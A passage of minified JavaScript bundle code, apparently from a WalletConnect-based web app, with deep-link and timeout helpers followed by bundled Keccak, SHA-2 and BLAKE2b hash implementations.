new Map(Object.entries(r))}function t1(r=fe.FIVE_MINUTES,e){const t=fe.toMiliseconds(r||fe.FIVE_MINUTES);let i,n,s,o;return{resolve:a=>{s&&i&&(clearTimeout(s),i(a),o=Promise.resolve(a))},reject:a=>{s&&n&&(clearTimeout(s),n(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},t),i=a,n=c})}}function Mf(r,e,t){return new Promise(async(i,n)=>{const s=setTimeout(()=>n(new Error(t)),e);try{const o=await r;i(o)}catch(o){n(o)}clearTimeout(s)})}function ore(r,e){if(typeof e=="string"&&e.startsWith(`${r}:`))return e;if(r.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(r.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${r}`)}function gUe(r){return ore("topic",r)}function mUe(r){return ore("id",r)}function are(r){const[e,t]=r.split(":"),i={id:void 0,topic:void 0};if(e==="topic"&&typeof t=="string")i.topic=t;else if(e==="id"&&Number.isInteger(Number(t)))i.id=Number(t);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${t}`);return i}function ws(r,e){return fe.fromMiliseconds(Date.now()+fe.toMiliseconds(r))}function xf(r){return Date.now()>=fe.toMiliseconds(r)}function Ni(r,e){return`${r}${e?`:${e}`:""}`}function Cd(r=[],e=[]){return[...new Set([...r,...e])]}async function wUe({id:r,topic:e,wcDeepLink:t}){var i;try{if(!t)return;const n=typeof t=="string"?JSON.parse(t):t,s=n?.href;if(typeof s!="string")return;const o=bUe(s,r,e),a=z4();if(a===uc.browser){if(!((i=vn.getDocument())!=null&&i.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}vUe(o)}else a===uc.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(n){console.error(n)}}function bUe(r,e,t){const i=`requestId=${e}&sessionTopic=${t}`;r.endsWith("/")&&(r=r.slice(0,-1));let n=`${r}`;if(r.startsWith("https://t.me")){const s=r.includes("?")?"&startapp=":"?startapp=";n=`${n}${s}${EUe(i,!0)}`}else n=`${n}/wc?${i}`;return n}function vUe(r){let e="_self";CUe()?e="_top":(xUe()||r.startsWith("https://")||r.startsWith("http://"))&&(e="_blank"),window.open(r,e,"noreferrer noopener")}async function yUe(r,e){let t="";try{if(L3()&&(t=localStorage.getItem(e),t))return t;t=await r.getItem(e)}catch(i){console.error(i)}return t}function jz(r,e){if(!r.includes(e))return null;const t=r.split(/([&,?,=])/),i=t.indexOf(e);return t[i+2]}function Fz(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,r=>{const e=Math.random()*16|0;return(r==="x"?e:e&3|8).toString(16)})}function vO(){return typeof process<"u"&&QLe.IS_VITEST==="true"}function xUe(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function CUe(){try{return window.self!==window.top}catch{return!1}}function EUe(r,e=!1){const t=Buffer.from(r).toString("base64");return e?t.replace(/[=]/g,""):t}function cre(r){return Buffer.from(r,"base64").toString("utf-8")}function _Ue(r){return new Promise(e=>setTimeout(e,r))}let SUe=class{constructor({limit:e}){Lz(this,"limit"),Lz(this,"set"),this.limit=e,this.set=new Set}add(e){if(!this.set.has(e)){if(this.set.size>=this.limit){const t=this.set.values().next().value;t&&this.set.delete(t)}this.set.add(e)}}has(e){return this.set.has(e)}};const d8=BigInt(2**32-1),qz=BigInt(32);function lre(r,e=!1){return e?{h:Number(r&d8),l:Number(r>>qz&d8)}:{h:Number(r>>qz&d8)|0,l:Number(r&d8)|0}}function ure(r,e=!1){const t=r.length;let i=new Uint32Array(t),n=new Uint32Array(t);for(let s=0;s<t;s++){const{h:o,l:a}=lre(r[s],e);[i[s],n[s]]=[o,a]}return[i,n]}const zz=(r,e,t)=>r>>>t,Wz=(r,e,t)=>r<<32-t|e>>>t,Cf=(r,e,t)=>r>>>t|e<<32-t,Ef=(r,e,t)=>r<<32-t|e>>>t,o5=(r,e,t)=>r<<64-t|e>>>t-32,a5=(r,e,t)=>r>>>t-32|e<<64-t,AUe=(r,e)=>e,IUe=(r,e)=>r,TUe=(r,e,t)=>r<<t|e>>>32-t,kUe=(r,e,t)=>e<<t|r>>>32-t,NUe=(r,e,t)=>e<<t-32|r>>>64-t,PUe=(r,e,t)=>r<<t-32|e>>>64-t;function tu(r,e,t,i){const n=(e>>>0)+(i>>>0);return{h:r+t+(n/2**32|0)|0,l:n|0}}const yO=(r,e,t)=>(r>>>0)+(e>>>0)+(t>>>0),xO=(r,e,t,i)=>e+t+i+(r/2**32|0)|0,$Ue=(r,e,t,i)=>(r>>>0)+(e>>>0)+(t>>>0)+(i>>>0),RUe=(r,e,t,i,n)=>e+t+i+n+(r/2**32|0)|0,OUe=(r,e,t,i,n)=>(r>>>0)+(e>>>0)+(t>>>0)+(i>>>0)+(n>>>0),BUe=(r,e,t,i,n,s)=>e+t+i+n+s+(r/2**32|0)|0,H2=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function CO(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function y0(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function dl(r,...e){if(!CO(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function EO(r){if(typeof r!="function"||typeof r.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");y0(r.outputLen),y0(r.blockLen)}function vp(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function _O(r,e){dl(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}function Sy(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function hl(...r){for(let e=0;e<r.length;e++)r[e].fill(0)}function rI(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}function Wu(r,e){return r<<32-e|r>>>e}const dre=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function hre(r){return r<<24&4278190080|r<<8&16711680|r>>>8&65280|r>>>24&255}const $h=dre?r=>r:r=>hre(r);function MUe(r){for(let e=0;e<r.length;e++)r[e]=hre(r[e]);return r}const _f=dre?r=>r:MUe,fre=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",DUe=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function Ay(r){if(dl(r),fre)return r.toHex();let e="";for(let t=0;t<r.length;t++)e+=DUe[r[t]];return e}const Ch={_0:48,_9:57,A:65,F:70,a:97,f:102};function Hz(r){if(r>=Ch._0&&r<=Ch._9)return r-Ch._0;if(r>=Ch.A&&r<=Ch.F)return r-(Ch.A-10);if(r>=Ch.a&&r<=Ch.f)return r-(Ch.a-10)}function SO(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);if(fre)return Uint8Array.fromHex(r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=Hz(r.charCodeAt(s)),a=Hz(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function LUe(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}function fu(r){return typeof r=="string"&&(r=LUe(r)),dl(r),r}function A1(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];dl(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}let KC=class{};function W4(r){const e=i=>r().update(fu(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function UUe(r){const e=(i,n)=>r(n).update(fu(i)).digest(),t=r({});return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=i=>r(i),e}function U3(r=32){if(H2&&typeof H2.getRandomValues=="function")return H2.getRandomValues(new Uint8Array(r));if(H2&&typeof H2.randomBytes=="function")return Uint8Array.from(H2.randomBytes(r));throw new Error("crypto.getRandomValues must be defined")}const jUe=BigInt(0),Pb=BigInt(1),FUe=BigInt(2),qUe=BigInt(7),zUe=BigInt(256),WUe=BigInt(113),pre=[],gre=[],mre=[];for(let r=0,e=Pb,t=1,i=0;r<24;r++){[t,i]=[i,(2*t+3*i)%5],pre.push(2*(5*i+t)),gre.push((r+1)*(r+2)/2%64);let n=jUe;for(let s=0;s<7;s++)e=(e<<Pb^(e>>qUe)*WUe)%zUe,e&FUe&&(n^=Pb<<(Pb<<BigInt(s))-Pb);mre.push(n)}const wre=ure(mre,!0),HUe=wre[0],VUe=wre[1],Vz=(r,e,t)=>t>32?NUe(r,e,t):TUe(r,e,t),Kz=(r,e,t)=>t>32?PUe(r,e,t):kUe(r,e,t);function KUe(r,e=24){const t=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let o=0;o<10;o++)t[o]=r[o]^r[o+10]^r[o+20]^r[o+30]^r[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=t[c],u=t[c+1],d=Vz(l,u,1)^t[a],h=Kz(l,u,1)^t[a+1];for(let f=0;f<50;f+=10)r[o+f]^=d,r[o+f+1]^=h}let n=r[2],s=r[3];for(let o=0;o<24;o++){const a=gre[o],c=Vz(n,s,a),l=Kz(n,s,a),u=pre[o];n=r[u],s=r[u+1],r[u]=c,r[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)t[a]=r[o+a];for(let a=0;a<10;a++)r[o+a]^=~t[(a+2)%10]&t[(a+4)%10]}r[0]^=HUe[i],r[1]^=VUe[i]}hl(t)}let GUe=class bre extends KC{constructor(e,t,i,n=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=t,this.outputLen=i,this.enableXOF=n,this.rounds=s,y0(i),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=Sy(this.state)}clone(){return this._cloneInto()}keccak(){_f(this.state32),KUe(this.state32,this.rounds),_f(this.state32),this.posOut=0,this.pos=0}update(e){vp(this),e=fu(e),dl(e);const{blockLen:t,state:i}=this,n=e.length;for(let s=0;s<n;){const o=Math.min(t-this.pos,n-s);for(let a=0;a<o;a++)i[this.pos++]^=e[s++];this.pos===t&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:t,pos:i,blockLen:n}=this;e[i]^=t,(t&128)!==0&&i===n-1&&this.keccak(),e[n-1]^=128,this.keccak()}writeInto(e){vp(this,!1),dl(e),this.finish();const t=this.state,{blockLen:i}=this;for(let n=0,s=e.length;n<s;){this.posOut>=i&&this.keccak();const o=Math.min(i-this.posOut,s-n);e.set(t.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return y0(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(_O(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,hl(this.state)}_cloneInto(e){const{blockLen:t,suffix:i,outputLen:n,rounds:s,enableXOF:o}=this;return e||(e=new bre(t,i,n,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=i,e.outputLen=n,e.enableXOF=o,e.destroyed=this.destroyed,e}};const ZUe=(r,e,t)=>W4(()=>new GUe(e,r,t)),YUe=ZUe(1,136,256/8);function JUe(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}function QUe(r,e,t){return r&e^~r&t}function XUe(r,e,t){return r&e^r&t^e&t}let vre=class extends KC{constructor(e,t,i,n){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.buffer=new Uint8Array(e),this.view=rI(this.buffer)}update(e){vp(this),e=fu(e),dl(e);const{view:t,buffer:i,blockLen:n}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=rI(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){vp(this),_O(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,hl(this.buffer.subarray(o)),this.padOffset>n-o&&(this.process(i,0),o=0);for(let d=o;d<n;d++)t[d]=0;JUe(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=rI(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=n,e.pos=a,n%t&&e.buffer.set(i),e}clone(){return this._cloneInto()}};const tf=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),So=Uint32Array.from([3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]),Ao=Uint32Array.from([1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209]),eje=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),rf=new Uint32Array(64);let tje=class extends vre{constructor(e=32){super(64,e,8,!1),this.A=tf[0]|0,this.B=tf[1]|0,this.C=tf[2]|0,this.D=tf[3]|0,this.E=tf[4]|0,this.F=tf[5]|0,this.G=tf[6]|0,this.H=tf[7]|0}get(){const{A:e,B:t,C:i,D:n,E:s,F:o,G:a,H:c}=this;return[e,t,i,n,s,o,a,c]}set(e,t,i,n,s,o,a,c){this.A=e|0,this.B=t|0,this.C=i|0,this.D=n|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,t){for(let d=0;d<16;d++,t+=4)rf[d]=e.getUint32(t,!1);for(let d=16;d<64;d++){const h=rf[d-15],f=rf[d-2],p=Wu(h,7)^Wu(h,18)^h>>>3,g=Wu(f,17)^Wu(f,19)^f>>>10;rf[d]=g+rf[d-7]+p+rf[d-16]|0}let{A:i,B:n,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let d=0;d<64;d++){const h=Wu(a,6)^Wu(a,11)^Wu(a,25),f=u+h+QUe(a,c,l)+eje[d]+rf[d]|0,p=(Wu(i,2)^Wu(i,13)^Wu(i,22))+XUe(i,n,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=n,n=i,i=f+p|0}i=i+this.A|0,n=n+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(i,n,s,o,a,c,l,u)}roundClean(){hl(rf)}destroy(){this.set(0,0,0,0,0,0,0,0),hl(this.buffer)}};const yre=ure(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(r=>BigInt(r))),rje=yre[0],ije=yre[1],nf=new Uint32Array(80),sf=new Uint32Array(80);let AO=class extends vre{constructor(e=64){super(128,e,16,!1),this.Ah=Ao[0]|0,this.Al=Ao[1]|0,this.Bh=Ao[2]|0,this.Bl=Ao[3]|0,this.Ch=Ao[4]|0,this.Cl=Ao[5]|0,this.Dh=Ao[6]|0,this.Dl=Ao[7]|0,this.Eh=Ao[8]|0,this.El=Ao[9]|0,this.Fh=Ao[10]|0,this.Fl=Ao[11]|0,this.Gh=Ao[12]|0,this.Gl=Ao[13]|0,this.Hh=Ao[14]|0,this.Hl=Ao[15]|0}get(){const{Ah:e,Al:t,Bh:i,Bl:n,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:u,Fh:d,Fl:h,Gh:f,Gl:p,Hh:g,Hl:w}=this;return[e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w]}set(e,t,i,n,s,o,a,c,l,u,d,h,f,p,g,w){this.Ah=e|0,this.Al=t|0,this.Bh=i|0,this.Bl=n|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=u|0,this.Fh=d|0,this.Fl=h|0,this.Gh=f|0,this.Gl=p|0,this.Hh=g|0,this.Hl=w|0}process(e,t){for(let S=0;S<16;S++,t+=4)nf[S]=e.getUint32(t),sf[S]=e.getUint32(t+=4);for(let S=16;S<80;S++){const T=nf[S-15]|0,k=sf[S-15]|0,I=Cf(T,k,1)^Cf(T,k,8)^zz(T,k,7),E=Ef(T,k,1)^Ef(T,k,8)^Wz(T,k,7),C=nf[S-2]|0,N=sf[S-2]|0,L=Cf(C,N,19)^o5(C,N,61)^zz(C,N,6),$=Ef(C,N,19)^a5(C,N,61)^Wz(C,N,6),y=$Ue(E,$,sf[S-7],sf[S-16]),A=RUe(y,I,L,nf[S-7],nf[S-16]);nf[S]=A|0,sf[S]=y|0}let{Ah:i,Al:n,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:u,Eh:d,El:h,Fh:f,Fl:p,Gh:g,Gl:w,Hh:m,Hl:x}=this;for(let S=0;S<80;S++){const T=Cf(d,h,14)^Cf(d,h,18)^o5(d,h,41),k=Ef(d,h,14)^Ef(d,h,18)^a5(d,h,41),I=d&f^~d&g,E=h&p^~h&w,C=OUe(x,k,E,ije[S],sf[S]),N=BUe(C,m,T,I,rje[S],nf[S]),L=C|0,$=Cf(i,n,28)^o5(i,n,34)^o5(i,n,39),y=Ef(i,n,28)^a5(i,n,34)^a5(i,n,39),A=i&s^i&a^s&a,b=n&o^n&c^o&c;m=g|0,x=w|0,g=f|0,w=p|0,f=d|0,p=h|0,{h:d,l:h}=tu(l|0,u|0,N|0,L|0),l=a|0,u=c|0,a=s|0,c=o|0,s=i|0,o=n|0;const v=yO(L,y,b);i=xO(v,N,$,A),n=v|0}({h:i,l:n}=tu(this.Ah|0,this.Al|0,i|0,n|0)),{h:s,l:o}=tu(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=tu(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:u}=tu(this.Dh|0,this.Dl|0,l|0,u|0),{h:d,l:h}=tu(this.Eh|0,this.El|0,d|0,h|0),{h:f,l:p}=tu(this.Fh|0,this.Fl|0,f|0,p|0),{h:g,l:w}=tu(this.Gh|0,this.Gl|0,g|0,w|0),{h:m,l:x}=tu(this.Hh|0,this.Hl|0,m|0,x|0),this.set(i,n,s,o,a,c,l,u,d,h,f,p,g,w,m,x)}roundClean(){hl(nf,sf)}destroy(){hl(this.buffer),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}},nje=class extends AO{constructor(){super(48),this.Ah=So[0]|0,this.Al=So[1]|0,this.Bh=So[2]|0,this.Bl=So[3]|0,this.Ch=So[4]|0,this.Cl=So[5]|0,this.Dh=So[6]|0,this.Dl=So[7]|0,this.Eh=So[8]|0,this.El=So[9]|0,this.Fh=So[10]|0,this.Fl=So[11]|0,this.Gh=So[12]|0,this.Gl=So[13]|0,this.Hh=So[14]|0,this.Hl=So[15]|0}};const Io=Uint32Array.from([573645204,4230739756,2673172387,3360449730,596883563,1867755857,2520282905,1497426621,2519219938,2827943907,3193839141,1401305490,721525244,746961066,246885852,2177182882]);let sje=class extends AO{constructor(){super(32),this.Ah=Io[0]|0,this.Al=Io[1]|0,this.Bh=Io[2]|0,this.Bl=Io[3]|0,this.Ch=Io[4]|0,this.Cl=Io[5]|0,this.Dh=Io[6]|0,this.Dl=Io[7]|0,this.Eh=Io[8]|0,this.El=Io[9]|0,this.Fh=Io[10]|0,this.Fl=Io[11]|0,this.Gh=Io[12]|0,this.Gl=Io[13]|0,this.Hh=Io[14]|0,this.Hl=Io[15]|0}};const GC=W4(()=>new tje),oje=W4(()=>new AO),aje=W4(()=>new nje),cje=W4(()=>new sje),lje=Uint8Array.from([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9]),ps=Uint32Array.from([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),gt=new Uint32Array(32);function of(r,e,t,i,n,s){const o=n[s],a=n[s+1];let c=gt[2*r],l=gt[2*r+1],u=gt[2*e],d=gt[2*e+1],h=gt[2*t],f=gt[2*t+1],p=gt[2*i],g=gt[2*i+1],w=yO(c,u,o);l=xO(w,l,d,a),c=w|0,{Dh:g,Dl:p}={Dh:g^l,Dl:p^c},{Dh:g,Dl:p}={Dh:AUe(g,p),Dl:IUe(g)},{h:f,l:h}=tu(f,h,g,p),{Bh:d,Bl:u}={Bh:d^f,Bl:u^h},{Bh:d,Bl:u}={Bh:Cf(d,u,24),Bl:Ef(d,u,24)},gt[2*r]=c,gt[2*r+1]=l,gt[2*e]=u,gt[2*e+1]=d,gt[2*t]=h,gt[2*t+1]=f,gt[2*i]=p,gt[2*i+1]=g}function af(r,e,t,i,n,s){const o=n[s],a=n[s+1];let c=gt[2*r],l=gt[2*r+1],u=gt[2*e],d=gt[2*e+1],h=gt[2*t],f=gt[2*t+1],p=gt[2*i],g=gt[2*i+1],w=yO(c,u,o);l=xO(w,l,d,a),c=w|0,{Dh:g,Dl:p}={Dh:g^l,Dl:p^c},{Dh:g,Dl:p}={Dh:Cf(g,p,16),Dl:Ef(g,p,16)},{h:f,l:h}=tu(f,h,g,p),{Bh:d,Bl:u}={Bh:d^f,Bl:u^h},{Bh:d,Bl:u}={Bh:o5(d,u,63),Bl:a5(d,u,63)},gt[2*r]=c,gt[2*r+1]=l,gt[2*e]=u,gt[2*e+1]=d,gt[2*t]=h,gt[2*t+1]=f,gt[2*i]=p,gt[2*i+1]=g}function uje(r,e={},t,i,n){if(y0(t),r<0||r>t)throw new Error("outputLen bigger than keyLen");const{key:s,salt:o,personalization:a}=e;if(s!==void 0&&(s.length<1||s.length>t))throw new Error("key length must be undefined or 1.."+t);if(o!==void 0&&o.length!==i)throw new Error("salt must be undefined or "+i);if(a!==void 0&&a.length!==n)throw new Error("personalization must be undefined or "+n)}class dje extends KC{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,this.length=0,this.pos=0,y0(e),y0(t),this.blockLen=e,this.outputLen=t,this.buffer=new Uint8Array(e),this.buffer32=Sy(this.buffer)}update(e){vp(this),e=fu(e),dl(e);const{blockLen:t,buffer:i,buffer32:n}=this,s=e.length,o=e.byteOffset,a=e.buffer;for(let c=0;c<s;){this.pos===t&&(_f(n),this.compress(n,0,!1),_f(n),this.pos=0);const l=Math.min(t-this.pos,s-c),u=o+c;if(l===t&&!(u%4)&&c+l<s){const d=new Uint32Array(a,u,Math.floor((s-c)/4));_f(d);for(let h=0;c+t<s;h+=n.length,c+=t)this.length+=t,this.compress(d,h,!1);_f(d);continue}i.set(e.subarray(c,c+l),this.pos),this.pos+=l,this.length+=l,c+=l}return this}digestInto(e){vp(this),_O(e,this);const{pos:t,buffer32:i}=this;this.finished=!0,hl(this.buffer.subarray(t)),_f(i),this.compress(i,0,!0),_f(i);const n=Sy(e);this.get().forEach((s,o)=>n[o]=$h(s))}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){const{buffer:t,length:i,finished:n,destroyed:s,outputLen:o,pos:a}=this;return e||(e=new this.constructor({dkLen:o})),e.set(...this.get()),e.buffer.set(t),e.destroyed=s,e.finished=n,e.length=i,e.pos=a,e.outputLen=o,e}clone(){return this._cloneInto()}}class hje extends dje{constructor(e={}){const t=e.dkLen===void 0?64:e.dkLen;super(128,t),this.v0l=ps[0]|0,this.v0h=ps[1]|0,this.v1l=ps[2]|0,this.v1h=ps[3]|0,this.v2l=ps[4]|0,this.v2h=ps[5]|0,this.v3l=ps[6]|0,this.v3h=ps[7]|0,this.v4l=ps[8]|0,this.v4h=ps[9]|0,this.v5l=ps[10]|0,this.v5h=ps[11]|0,this.v6l=ps[12]|0,this.v6h=ps[13]|0,this.v7l=ps[14]|0,this.v7h=ps[15]|0,uje(t,e,64,16,16);let{key:i,personalization:n,salt:s}=e,o=0;if(i!==void 0&&(i=fu(i),o=i.length),this.v0l^=this.outputLen|o<<8|65536|1<<24,s!==void 0){s=fu(s);const a=Sy(s);this.v4l^=$h(a[0]),this.v4h^=$h(a[1]),this.v5l^=$h(a[2]),this.v5h^=$h(a[3])}if(n!==void 0){n=fu(n);const a=Sy(n);this.v6l^=$h(a[0]),this.v6h^=$h(a[1]),this.v7l^=$h(a[2]),this.v7h^=$h(a[3])}if(i!==void 0){const a=new 